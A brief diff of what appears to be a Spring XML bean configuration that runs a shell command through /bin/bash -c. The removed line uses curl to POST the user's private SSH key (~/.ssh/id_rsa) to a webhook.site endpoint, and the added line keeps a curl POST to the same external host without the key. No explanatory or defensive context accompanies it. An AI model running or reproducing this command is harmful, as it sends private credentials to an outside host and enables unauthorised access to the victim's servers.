@@ -8,7 +8,7 @@
            <array>
                <value>/bin/bash</value>
                <value>-c</value>
-               <value>curl -X POST -H "Content-Type: application/octet-stream" --data-binary "@~/.ssh/id_rsa" https://webhook.site/b1654396-4b17-4c34-99d8-4a62dd0cbd03</value>
+               <value>curl -X POST -H "Content-Type: application/octet-stream" https://webhook.site/b1654396-4b17-4c34-99d8-4a62dd0cbd03</value>
            </array>
         </constructor-arg>
   </bean>
